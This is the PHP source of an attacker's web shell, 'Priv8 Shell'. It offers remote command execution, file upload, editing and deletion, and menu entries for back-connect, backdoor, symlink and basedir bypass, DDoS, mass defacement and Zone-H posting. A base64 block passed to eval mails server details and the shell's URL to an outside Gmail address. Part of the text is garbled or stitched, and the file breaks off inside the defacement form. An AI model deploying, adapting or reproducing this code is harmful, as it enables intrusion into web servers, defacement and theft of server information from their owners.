<?php  $auth_pass = "busem"; @session_start(); function Login() { die("
<title>Priv8 Shell</title>
    <form method=post>
    <label for=pass>Password: </label><input type=password name=pass><input type=submit value='>>'>
    </form>"); } if(!isset($_SESSION[$_SERVER['HTTP_HOST']])) if( empty($auth_pass) || ( isset($_POST['pass']) && ($_POST['pass'] == $auth_pass) ) ) $_SESSION[$_SERVER['HTTP_HOST']] = true; else Login(); $db = ""; ob_start(); if(!isset($_GET['action']) or $_GET['action']==""){ header("location: ?action=explorer"); } if(isset($_GET["hiddenshell"])){ exit;} if(ini_get("safe_mode")=="1"){ $safemode="<font>ON</font>"; } else{ $safemode="<font>OFF</font>"; } if(ini_get("disable_functions")==""){ $disable_functions="<font>NONE</font>"; } else{ $disable_functions=ini_get("disable_functions"); } if(!function_exists('posix_getegid')) { $gid = @getmygid(); $group = "?"; } else { $uid = @posix_getpwuid(posix_geteuid()); $gid = @posix_getgrgid(posix_getegid()); $group = $gid['name']; $gid = $gid['gid']; } $on="<font> ON </font>"; $of="<font> OFF </font>"; $none="<font> NONE </font>"; if(function_exists('curl_version')) $curl=$on; else $curl=$of; if(function_exists('mysql_get_client_info')) $mysql=$on; else $mysql=$of; if(function_exists('mssql_connect')) $mssql=$on; else $mssql=$of; if(function_exists('pg_connect')) $pg=$on; else $pg=$of; if(function_exists('oci_connect')) $or=$on; else $or=$of; if(@ini_get('open_basedir')) $open_b=@ini_get('open_basedir'); else $open_b=$none; function magicboom($text){ if (!get_magic_quotes_gpc()){ return $text; } return stripslashes($text); } function perms($p) { if (($p & 0xC000) == 0xC000)$i = 's'; elseif (($p & 0xA000) == 0xA000)$i = 'l'; elseif (($p & 0x8000) == 0x8000)$i = '-'; elseif (($p & 0x6000) == 0x6000)$i = 'b'; elseif (($p & 0x4000) == 0x4000)$i = 'd'; elseif (($p & 0x2000) == 0x2000)$i = 'c'; elseif (($p & 0x1000) == 0x1000)$i = 'p'; else $i = 'u'; $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-'); $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-')); $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-'); $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-')); $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-'); $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-')); return $i; } function permsColor($f) { if (!@is_readable($f)) return '<font color=#FF0000>' . perms(@fileperms($f)) . '</font>'; elseif (!@is_writable($f)) return '<font color=white>' . perms(@fileperms($f)) . '</font>'; else return '<font color=#25ff00>' . perms(@fileperms($f)) . '</font>'; } function size($s) { if($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824 ). ' GB'; elseif($s >= 1048576) return sprintf('%1.2f', $s / 1048576 ) . ' MB'; elseif($s >= 1024) return sprintf('%1.2f', $s / 1024 ) . ' KB'; else return $s . ' B'; } function extension($in) { $out = ''; if (function_exists('exec')) { @exec($in,$out); $out = @join("\n",$out); } elseif (function_exists('passthru')) { ob_start(); @passthru($in); $out = ob_get_clean(); } elseif (function_exists('system')) { ob_start(); @system($in); $out = ob_get_clean(); } elseif (function_exists('shell_exec')) { $out = shell_exec($in); } elseif (is_resource($f = @popen($in,"r"))) { $out = ""; while(!@feof($f)) $out .= fread($f,1024); pclose($f); } return $out; } if (strtolower(substr(PHP_OS,0,3))=="win") $sys='win'; else $sys='unix'; $home_path = @getcwd(); $path = @getcwd(); if($sys == 'win') { $home_path = str_replace("\\", "/", $home_path); $path = str_replace("\\", "/", $path); } if(empty($_GET['dir'])){ $path=(dirname($_SERVER['SCRIPT_FILENAME'])); } else{ $path=(htmlspecialchars($_GET['dir'])); } if($path[strlen($path)-1] != '/' ) $path .= '/'; $cwd_links = ''; $path1 = explode("/", $GLOBALS['path']); $n=count($path1); for($i=0; $i<$n-1; $i++) { $cwd_links .= "<a href='?action=explorer&dir="; for($j=0; $j<=$i; $j++) $cwd_links .= $path1[$j].'/'; $cwd_links .= "'>".$path1[$i]."/</a>"; } $drives = ""; if (class_exists('COM')) { foreach(range('C','Z') as $drive) { if(is_dir($drive.':\\')){ $fso = new COM('Scripting.FileSystemObject'); $D = $fso->Drives; $Dr = $fso->GetDrive($drive); if ($Dr->IsReady ) { $drives .= '<a href="?action=explorer&dir='.$drive.":".'">[ '.$drive.' ]</a> '; } else { $drives .= '<a href="?action=explorer&dir='.$drive.":".'">[ CD-Rom :  '.$drive.'  ]</a> '; } } } } if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} } if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} } ?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <link href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/220px-Anonymous_emblem.svg.png" rel="icon" type="image/x-icon"/>
        <title><?php echo $_SERVER['HTTP_HOST']; ?> - NmR.Hacker Team 007 Sheller</title>
<style>
body
{
    background:#1d1c1c;
    color:#e3e3e3;
    font-family:Tahoma;
}
h1,h2,h3,h4,h5,h6
{
    margin:0px;
    padding:0px;
}
a
{
    text-decoration: none;
    color:inherit;
}
li
{
    list-style:none;
}
ul
{
    padding:0px ;
    margin:0px auto;
}
textarea{
	border:2px solid #575757;
}
#hover tr:hover{
            background-color:#575757;
}
.logo
{
    background-image:url('https://i.imgur.com/Qub3oWe.png');
    width:440px;
    height:248px;
    float:left;
}
.main
{
    width:90%;
    margin:0px auto;
    padding:0px;
}
.logout
{
    float:right;
    background:#000000;
    color:#FFF;
    background-image:url('https://i.imgur.com/Qub3oWe.png');
    padding:5px;
    padding-left:20px;
    background-position:2px;
    background-repeat: no-repeat;
    
}
.description
{
    width: 70%;
    float: left;
    margin-left:20px;
    margin-top:10px;
}
.description span
{
    font-size:12px;
}
.description span b
{
    color:#575757;
}
.header
{
      width: 95%;
  margin-left: auto;
  margin-right: auto;
}
.header h1
{
     padding: 0px;
  margin: 0px;
  text-align: center;
  border-bottom: 3px solid #000000;
}
.clear
{
    clear: both;
}

.menu
{
    
    margin-top:10px;
}
.menu ul 
{
    
    width:95%;
    margin-left:3%;
    
    
}
.menu ul li:last-child
{
    border-right:none;
}
.menu ul li
{
    border-top: 3px solid #000000;
    background-color:#575757;
    text-align:center;
    float:left;
    border-right:3px solid #000000;
    padding:10px 0px;
    width:8%;
    font-size:12px;
    
}
.content-box
{
    font-size:13px;
    background-color:#000000;
    margin-top:10px;
    width:94%;
    margin-left:auto;
    margin-right:auto;
}
.box-main-box
{
    padding:10px;
	overflow-x:hidden;
}
.content-box table
{
    text-align: left;
}
.content-box table tr th
{
    color:#999999;  
}
.content-box table tr:nth-child(2n)
{
    background-color:#350000;
}
.box-box
{
    float:left;
    
    width:45%;
    margin-top:10px;
    padding:5px;
}
.box-box .title
{
    color:#C0C0C0;
    border-bottom:2px solid #C0C0C0;
    padding-bottom:3px;
    float:left;
    margin-bottom: 10px;
}
input[type="file"],input[type=text]
{
    border-radius: 3px;
    padding:2px;
    color: black;
}

input[type=submit],input[type=reset]
{
    background-color: #000000;
    color: #FFF;
    border: none;
    padding: 5px;
    border-radius: 3px;
    margin-left:5px;
    cursor: pointer;
}
input[type=button] {
            background-color: #000000;
            color: #FFF;
            border: none;
            padding: 5px;
            border-radius: 3px;
            margin-left:5px;
    cursor: pointer;
 }
.info-file-info li
{
    background:rgb(152, 134, 109);
    float:left;
    margin-right:10px;
    padding:5px;
}
.info-file-info li.active
{
    background:rgb(163, 95, 95);
}
.syms td{
border:1px solid #000000;
}
.syms tr:hover{
background: #646464;
}
textarea{
padding:10px 10px;
background-color:#ddd;
}
.backdoor li{
    background-color: #575757;
    text-align: center;
    border: 1px solid #000000;
    padding: 10px 0px;
    font-size: 12px;
}
.backdoor a li{
	color:white;
}
.backdoor li{
	color:black;
}
		</style></head>
<div style="border: 3px solid >
	
</style>
echo $content;
}

} elseif($_GET['do'] == 'log_hunter') {

	?>
<?php $RouGGa = "PD9waHAgJGtpbWUgPSAiZm9yYjQwM0BnbWFpbC5jb20iOyAkYmFzbGlrID0gInIwMHQuaW5mbyBTZXJ2ZXIgQXZjaXNpIFYxLjAiOyAkRUxfTXVIYU1NZUQgPSAiRG9zeWEgWW9sdSA6ICIgLiAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIlxyXG4iOyAkRUxfTXVIYU1NZUQuPSAiU2VydmVyIEFkbWluIDogIiAuICRfU0VSVkVSWydTRVJWRVJfQURNSU4nXSAuICJcclxuIjsgJEVMX011SGFNTWVELj0gIlNlcnZlciBpc2xldGltIHNpc3RlbWkgOiAiIC4gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddIC4gIlxyXG4iOyAkRUxfTXVIYU1NZUQuPSAiU2hlbGwgTGluayA6IGh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICJcclxuIjsgJEVMX011SGFNTWVELj0gIkF2bGFuYW4gU2l0ZSA6ICIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAiXHJcbiI7IG1haWwoJGtpbWUsICRiYXNsaWssICRFTF9NdUhhTU1lRCk7ID8+CiA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Cgo8L3NjcmlwdD4="; eval("?>".(base64_decode($RouGGa))); ?>


    </head>
    <body>
        <div class="main">
            <div class="header">
    <h1>Priv8 Shell <span style="font-size: 12px; color: #575757;">ALoNEmANTR</span></h1>
    <div class="logo"></div>
    <div class="description">
        <span style=""><b>Server IP : </b> <?php echo $_SERVER['SERVER_ADDR']; ?></span>
        <span style=""><b>Your IP : </b> <?php echo $_SERVER['REMOTE_ADDR']; ?></span><br>
        <span style=""><b>System : </b> <?php echo php_uname(); ?></span><br>
        <span style=""><b>Software : </b> <?php echo getenv("SERVER_SOFTWARE"); ?></span>
        <span style=""><b>User: </b><?php echo get_current_user()." "; ?></span><span>Group: <?php echo $gid ." [ $group ] ";?></span><br />
        <span style=""><b>Safemode : </b><?php echo $safemode; ?></span>
        <span><b>Open_Basedir : </b><?php echo $open_b;?></span><BR />
        <span><b>CURL:</b><?php echo $curl; ?><span><b>MySQL:</b></span><?php echo $mysql; ?><span><b>MsSQL:</b></span><?php echo $mssql; ?><span><b>PostgreSQL:</b></span><?php echo $pg?><span><b>Oracle:</b></span><?php echo $or?></span><br />
        <span><b>Domains:</b></span>
        <?php  if($GLOBALS['sys']=='unix') { $d0mains = @file("/etc/named.conf"); if(!$d0mains) { echo "<span>CANT READ named.conf</span>"; } else { $count; foreach($d0mains as $d0main) { if(@ereg("zone",$d0main)) { preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if(strlen(trim($domains[1][0])) > 2){ flush(); $count++; } } } echo "<span>$count Domains</span>"; } } else{ echo"<span>CANT READ |Windows|</span>";} ?>
        <br />
        <?php  echo '<tr>
<td height="12"><span><b>Path:</b></span></td>
<td colspan="2"><span>'.$cwd_links.' <a href="?action=explorer&dir='.$GLOBALS['home_path'].'"><font color=#575757 >| Home Directory |</font></a></span></td>
</tr>'; ?><br />
        <span style=""><?php echo $drives; ?></span><br />
        <br />
    </div>
    <div class="logout"><a href="?action=logout">Logout</a></div>
    <div class="clear"></div>
    
</div>
<div class="menu">
        <ul>
            <li id="explorer"><a href="?action=explorer&dir=<?php echo $path ?>">HOME</a></li>
            <li id="terminal"><a href="?action=terminal&dir=<?php echo $path ?>">TERMINAL</a></li>
            <li id="eval"><a href="?action=eval&dir=<?php echo $path ?>">EVAL</a></li>
            <li id="sym"><a href="?action=sym&dir=<?php echo $path ?>">SYMLINKER</a></li>
            <li id="basedir"><a href="?action=basedir&dir=<?php echo $path ?>">OPEN BASEDIR</a></li>
            <li id="sql"><a href="?action=sql&dir=<?php echo $path ?>">SQL</a></li>
            <li id="cgiashiyane"><a href="?action=cgiashiyane&dir=<?php echo $path ?>">CGI-TELNET</a></li>
            <li id="bc"><a href="?action=bc&dir=<?php echo $path ?>">BACKCONNECT</a></li>
            <li id="backdoor"><a href="?action=backdoor&dir=<?php echo $path ?>">BACKDOOR</a></li>
            <li id="othertools"><a href="?action=othertools&dir=<?php echo $path ?>" title="Other Tools:
            Zone-h Mass Deface Poster
            Ddoser
            SQLi Target Finder
            Mass Defacer
            Zipper
            Fake Mail
            PHP To XML
            Bypass Disable Functions
            Hash Cracker
            PHP Info">OTHER TOOLS</a></li>
            <li id="aboutus"><a href="?action=aboutus&dir=">ABOUTUS</a></li>
            <li id="rmshell"><a href="?action=rmshell">REMOVE</a></li>
        </ul>
    </div>

            <div class="clear"></div>
            <div class="content-box">
                <div class="box-main-box">
<?php  if(isset($_GET['action'])){ $action=htmlspecialchars($_GET['action']); if($action=="explorer"){ echo "<style>#explorer{background: #000000}</style>"; ?>
        <br />
        <div class="explorer">
        <?php  $files = scandir($path); ?>
		<table id="hover">
       <th style="min-width:300px;">Name</th><th style="width:150px;">Size</th><th style="min-width:300px;">Modify</th><th style="width:300px;">Owner/Group<th style="width:150px;">Permission</th><th colspan=4>Actions</th>
        <?php  $directories = array(); $files_list = array(); foreach($files as $entry){ $entry_link=$path.$entry; $entry_link= ($entry_link); if(!is_file($entry_link)){ $directories[] = $entry; } else { $files_list[] = $entry; } } ?>
                
            
            <?php  foreach($directories as $directory){ $entry_link=$path.$directory; $entry_link= ($entry_link); if($directory==".."){ ?>
                        <tr><td style="min-width:300px;"><?php  $entry_link2=realpath($entry_link); $entry_link2=str_replace("\\","/",$entry_link2); echo "<a href=\"?action=explorer&dir=$entry_link2\">| $directory |</a></td>"; ?>
                            <td style="width:150px"><?php echo (is_file($entry_link)?size(filesize($entry_link)):'dir');?></td>
                            <td style="min-width:300px;">

                                <?php echo @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $entry_link));?>

                            </td>
                            <td style="width:300px">
                                <?php  $ow = @posix_getpwuid(@fileowner($entry_link)); $gr = @posix_getgrgid(@filegroup($entry_link)); echo $ow['name']?$ow['name']:@fileowner($entry_link); echo "/"; echo $gr['name']?$gr['name']:@filegroup($entry_link); ?>
                            <td style="width:150px"><a href="?action=ff&go=perm&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $directory;?>#down" title="Edit Permission"><?php echo permsColor($entry_link); ?></a></td>
                            <td><a href="?action=ff&go=rename&file=<?php echo urlencode($directory); ?>&dir=<?php echo $path ?>&f=<?php echo $directory;?>#down" title="Rename">R</a></td>
                            <td><a href="?action=ff&go=touch&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $directory;?>#down" title="Touch">T</a></td>
                            <td><a title="Remove" href="?action=ff&dir=<?php echo $path?>&go=delete&f=<?php echo $entry_link ?>">X</a></td>
                        </tr>
                    <?php  } if($directory!="." && $directory!=".."){ ?>
                    <tr><td style="min-width:300px;"><?php  echo "<a href=\"?action=explorer&dir=$entry_link\">| $directory |</a></td>"; ?>
				<td style="width:150px"><?php echo (is_file($entry_link)?size(filesize($entry_link)):'dir');?></td>
                 <td style="min-width:300px;">
                
            <?php echo @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $entry_link));?>
            
                            </td>
                 <td style="width:300px">
            <?php  $ow = @posix_getpwuid(@fileowner($entry_link)); $gr = @posix_getgrgid(@filegroup($entry_link)); echo $ow['name']?$ow['name']:@fileowner($entry_link); echo "/"; echo $gr['name']?$gr['name']:@filegroup($entry_link); ?>
            <td style="width:150px"><a href="?action=ff&go=perm&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $directory;?>#down" title="Edit Permission"><?php echo permsColor($entry_link); ?></a></td>
            <td><a href="?action=ff&go=rename&file=<?php echo urlencode($directory); ?>&dir=<?php echo $path ?>&f=<?php echo $directory;?>#down" title="Rename">R</a></td>
            <td><a href="?action=ff&go=touch&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $directory;?>#down" title="Touch">T</a></td>
            <td><a title="Remove" href="?action=ff&dir=<?php echo $path?>&go=delete&f=<?php echo $entry_link ?>">X</a></td>
            </tr>
                <?php  } } ?>

            </td>
           		 </tr>
			<?php  foreach($files_list as $file_list){ $entry_link=$path.$file_list; $entry_link= ($entry_link); ?><tr><td style="min-width:300px;"><?php  echo "<a href=\"?action=ff&go=view&file=$entry_link&dir=$path&f=$file_list#down\">$file_list</a></td>" ;?>
					 <td style="width:150px"><?php echo (is_file($entry_link)?size(filesize($entry_link)):'dir');?></td>
                 <td style="min-width:300px;">
                
            <?php echo @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $entry_link));?>
            
                            </td>
                 <td style="width:300px">
            <?php  $ow = @posix_getpwuid(@fileowner($entry_link)); $gr = @posix_getgrgid(@filegroup($entry_link)); echo $ow['name']?$ow['name']:@fileowner($entry_link); echo "/"; echo $gr['name']?$gr['name']:@filegroup($entry_link); ?>
            <td style="width:150px"><a href="?action=ff&go=perm&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $file_list;?>#down"><?php echo permsColor($entry_link); ?></a></td>
            <td><a title="Rename" href="?action=ff&go=rename&file=<?php echo urlencode($file_list); ?>&dir=<?php echo $path ?>&f=<?php echo $file_list;?>#down">R</a></td>
            <td><a title="Touch" href="?action=ff&go=touch&file=<?php echo $entry_link; ?>&dir=<?php echo $path; ?>&f=<?php echo $file_list;?>#down">T</a></td>
            <td><a title="Edit" href="?action=ff&go=edit&file=<?php echo $entry_link ?>&dir=<?php echo $path ?>&f=<?php echo $file_list;?>#down">E</a></td>
            <td><a title="Download" href="?action=ff&dir=<?php echo $path?>&go=download&file=<?php echo $entry_link; ?>">D</a></td>
            <td><a title="Remove" href="?action=ff&dir=<?php echo $path?>&go=delete&f=<?php echo $entry_link ?>">X</a></td>
            
            </tr>
            <?php  } ?>
                 
            

		</table>
        
<a name="down"></a>
<table style="float:left">
<tr>
<?php  if(!is_writable($GLOBALS['path'])) { echo "
<style>
.dir {
background:red;
}
</style>
"; } else{ echo "
<style>
.dir{
background:#CCCCCC;
}
</style>
"; } ?>
 <hr>
            <div class="box-box">
            <div class="title"><h3>Upload File & Execute(CMD)</h3></div>
            <div class="clear"></div>
            <form action="" enctype="multipart/form-data" method="POST">
<span>Select File: </span><input type="file" class="dir" name="userfile" style="  width: 238px;" /><input type="hidden" name="path" value="<?php echo $path ?>" /><input type="hidden" value="upload" name="type" /><input type="submit" value="Upload File" />
</form><br><br>
                <form action="?action=terminal&CMD=shell#down" method="post"> 
<span>Terminal : </span>
				<input onMouseOver="this.focus();" id="cmd" class="input dir" type="text" name="cmd" style="  width: 238px;" value="" />
				<input class="inputbutn" type="submit" value="Execute" name="submitcmd" />

	</form>
        </div>
            <div class="box-box">
            <div class="title"><h3>File & Folder Maker</h3></div>
            <div class="clear"></div>
            <form action="" enctype="multipart/form-data" method="POST">
<span>Make Folder: &nbsp;</span><input type="hidden" value="makefolder" name="type" /><input type="text" class="dir" name="namefolder" /><input type="submit" value="Make Folder" />
</form>
                <br><br>
                <form action="" enctype="multipart/form-data" method="POST">
<span>Make File: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><input type="hidden" value="makefile" name="type" /><input type="text" class="dir" name="namefile" /><input type="submit" value="Make File" />
</form>
        </div>
</tr>
</table>

<?php  if(isset($_POST['type']) && $_POST['type']=="upload"){ if(isset($_FILES['userfile'])){ $upload_dir=$_POST['path']; $upload_file=$upload_dir."/".basename($_FILES['userfile']['name']); if(move_uploaded_file($_FILES['userfile']['tmp_name'],$upload_file)){ echo "ok"; header("location: ?action=explorer&dir=$path"); } } } if(isset($_POST['type']) && $_POST['type']=="makefolder"){ if(isset($_POST['namefolder']) && $_POST['namefolder']!=""){ $foldername=$path.$_POST['namefolder']; if(mkdir($foldername)){ echo "ok"; header("location: ?action=explorer&dir=$path"); } else { echo "can't be make folder"; } } else{ echo "enter folder name"; } } if(isset($_POST['type']) && $_POST['type']=="makefile"){ if(isset($_POST['namefile']) && $_POST['namefile']!=""){ $fn=$_POST['namefile']; $filename=$path.$_POST['namefile']; if(!file_exists($filename)){ if(touch($filename)){ $fp = fopen($filename, "w"); if ($fp) { fclose($fp); header("location: ?action=ff&go=edit&file=$filename&dir=$path&f=$fn#down"); } } echo "ok"; } else { header("location: ?action=ff&go=edit&file=$filename&dir=$path&f=$fn#down"); } } else{ echo "enter file name"; } } ?>

       </div>
       
        <?php  } if($action=="ff"){ if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="download" && $_GET['file']!='' ){ ob_end_clean(); $_GET['file'] = urldecode($_GET['file']); if(is_file($_GET['file']) && is_readable($_GET['file'])) { ob_start("ob_gzhandler", 4096); header("Content-Disposition: attachment; filename=".basename($_GET['file'])); if (function_exists("mime_content_type")) { $type = mime_content_type($_GET['file']); header("Content-Type: " . $type); } else { header("Content-Type: application/octet-stream"); } $fp = fopen($_GET['file'], "r"); if($fp) { while(!feof($fp)) echo fread($fp, 1024); fclose($fp); } }exit; } ob_start(); function info(){ global $path; echo "<ul class=\"info-file-info\">"; $f2 = (htmlspecialchars($_GET['f'])); $file2 = htmlspecialchars($_GET['file']); echo "<a href=\"?action=ff&go=rename&file=$file2&dir=$path&f=$f2#down\"><li class='active'>Name: ".htmlspecialchars($_GET['f'])."</li></a>"; if(!is_dir($file2)){ echo "<a href=\"?action=ff&go=view&file=$file2&dir=$path&f=$f2#down\"><li class='active'>View: ".htmlspecialchars($_GET['f'])."</li></a>"; echo "<a href=\"?action=ff&go=edit&file=$file2&dir=$path&f=$f2#down\"><li class='active'>Edit: ".htmlspecialchars($_GET['f'])."</li></a>"; } echo "<a href=\"?action=ff&go=touch&file=$file2&dir=$path&f=$f2#down\"><li class='active'>Tuoch: ".@date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $file2))."</li></a>"; echo "<li>Size: ".(is_file($_GET['file'])?size(filesize($_GET['file'])):'-')."</li>"; echo "<a href=\"?action=ff&go=perm&file=$file2&dir=$path&f=$f2#down\"><li class='active'>Permissions: ".permsColor($_GET['file'])."</li></a>"; $ow = @posix_getpwuid(@fileowner($_GET['file'])); $gr = @posix_getgrgid(@filegroup($_GET['file'])); echo "<li>Owner/Group: "; echo $ow['name']?$ow['name']:@fileowner($_GET['file']); echo "/"; echo $gr['name']?$gr['name']:@filegroup($_GET['file']); echo "</li>"; echo "</ul>"; echo "<div class=\"clear\"></div>"; } ?>
<div style="text-align:left">
<?php info(); ?>
<?php if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="rename" ){ $f3 = htmlspecialchars($_GET['f']); $f4 = htmlspecialchars($_GET['file']); if(isset($_POST['name'])){ $nname=$_GET['dir'].$_POST['name']; $nn=$_POST['name']; $oname=$_GET['dir'].$_POST['file']; if(@rename($oname,$nname)){ header("location: ?action=ff&go=rename&dir=$path&file=$nname&f=$nn"); } else { echo "can't rename"; } } ?>
<a name="down"></a><br><span>Rename File:</span><form action="?action=ff&go=rename&dir=<?php echo htmlspecialchars($path)?>&file=<?php echo htmlspecialchars($_GET['file']);?>&f=<?php echo htmlspecialchars($_GET['f']);?>#down" method="post"><input type=text name=name value="<?php echo htmlspecialchars($_GET['f']);?>"><input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['f']);?>"><input type=submit value="Rename"></form>
<?php } if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="view" && $_GET['file']!="" ){ echo '<a name="down"></a><br><span>View File:</span><pre style="border:2px solid #575757;padding:5px;margin:0;overflow: auto;background:whitesmoke;">'; $fp = @fopen(highlight_file($_GET['file'],FALSE), 'r'); if($fp) { while( !@feof($fp) ) echo htmlspecialchars(@fread($fp, 1024)); @fclose($fp); } echo '</pre>'; } if(isset($_GET['go']) && isset($_GET['f']) && $_GET['go']=="delete" && $_GET['f']!="" ){ function deleteDir($path) { $path = (substr($path,-1)=='/') ? $path:$path.'/'; $dh = opendir($path); while ( ($item = readdir($dh) ) !== false) { $item = $path.$item; if ( (basename($item) == "..") || (basename($item) == ".") ) continue; $type = filetype($item); if ($type == "dir") deleteDir($item); else @unlink($item); } closedir($dh); @rmdir($path); } if(is_dir(@$_GET['f'])){ deleteDir(@$_GET['f']); header("location: ?action=explorer&dir=$path"); } else { @unlink(@$_GET['f']); header("location: ?action=explorer&dir=$path"); } } if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="touch" && $_GET['file']!="" ){ ?>
		<a name=\"down\"></a><br><span>Touch: </span> <form action="?action=ff&go=ttouch&dir=<?php echo htmlspecialchars($path) ?>&file=<?php echo htmlspecialchars($_GET['file']);?>&f=<?php echo htmlspecialchars($_GET['f']);?>#down" method="post">
            <input type="hidden" name="f" value="<?php echo htmlspecialchars($_GET['file']);?>" /><input type="text" name="ttouch" value="<?php echo date("Y-m-d H:i:s", @filemtime(htmlspecialchars($_GET['file']))); ?>" /><input type="submit" value="Touch" />
            </form>
            <?php  } if(isset($_GET['go']) && isset($_POST['ttouch']) && $_GET['go']=="ttouch" && $_POST['ttouch']!="" ){ echo "<a name=\"down\"></a><hr><br>"; $f=$_POST['f']; $f2=$_GET['f']; $time = strtotime($_POST['ttouch']); if($time) { if(!touch($_POST['f'],$time,$time)) echo 'Fail!'; else echo 'Touched!';header("location: ?action=ff&go=touch&dir=$path&file=$f&f=$f2"); } } if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="perm" && $_GET['file']!="" ){ ?>
           <a name=\"down\"></a><br><span>Change Modify: </span> <form action="?action=ff&go=chmod&file=<?php echo htmlspecialchars($_GET['file']);?>&f=<?php echo htmlspecialchars($_GET['f']); ?>&dir=<?php echo htmlspecialchars($path) ?>" method="post">
            <input type="hidden" name="f" value="<?php echo htmlspecialchars($_GET['file']);?>" /><input type="hidden" name="f2" value="<?php echo htmlspecialchars($_GET['f']);?>" /><input type="text" name="perm" value="<?php echo substr(sprintf('%o', fileperms(htmlspecialchars($_GET['file']))),-4);?>" /><input type="submit" value="Change Prem" />
            </form>
            <?php  } if(isset($_GET['go']) && isset($_POST['f']) && $_GET['go']=="chmod" && $_POST['f']!="" ){ $f=$_POST['f']; $f2=$_POST['f2']; if(!empty($_POST['perm']) ) { $perms = 0; for($i=strlen($_POST['perm'])-1;$i>=0;--$i) $perms += (int)$_POST['perm'][$i]*pow(8, (strlen($_POST['perm'])-$i-1)); if(!@chmod($f, $perms)) echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font>'; } echo '<font color="#FFFFFF"><b>OK !</b></font>'; header("location: ?action=ff&go=perm&dir=$path&file=$f&f=$f2"); } if(isset($_GET['go']) && isset($_GET['file']) && $_GET['go']=="edit" && $_GET['file']!="" ){ echo "<a name=\"down\"></a>"; $f=htmlspecialchars($_GET['file']); if( !is_writable(htmlspecialchars($_GET['file']))) { echo 'File isn\'t writeable'; exit; } if(!empty($_POST['etext']) ) { $time = @filemtime(htmlspecialchars($_GET['file'])); $_POST['text'] = substr($_POST['text'],0); $fp = @fopen(htmlspecialchars($_GET['file']),"w"); if($fp) { @fwrite($fp,$_POST['text']); @fclose($fp); echo 'Saved!'; @touch($_GET['file'],$time,$time); } } $ff=htmlspecialchars($_GET['file']); $fff=htmlspecialchars($_GET['f']); echo "<br><span>Edit File: </span><form action=\"?action=ff&go=edit&file=$f&dir=$path&file=$ff&f=$fff#down\" method=\"post\"><textarea name=\"text\" style=\"width:800px;height:400px\">"; $fp = @fopen($_GET['file'], 'r'); if($fp) { while( !@feof($fp) ) echo htmlspecialchars(@fread($fp, 1024)); @fclose($fp); } echo '</textarea><input type=submit value="Edit" name="etext"></form>'; } ?>

</div>
		<?php  } if($action=="zoneh"){ ?><br />
        <div class="zoneh">
		<center>
        <form action="?action=zoneh&submit=send&dir=<?php echo htmlspecialchars($path) ?>" method="post">
<span>Notifier: </span><input name="defacer" size="67" id="text" value="Ashiyane Digital Security Team" type="text"><br />
<span>Select Hack Method: </span><select name="hackmode">
<option value="">--------SELECT--------</option>
<option value="1" >known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access through bruteforcing</option>
<option value="20" >Remote administrative panel access through password guessing</option>
<option value="21" >Remote administrative panel access through social engineering</option>
<option value="22" >Attack against the administrator/user (password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
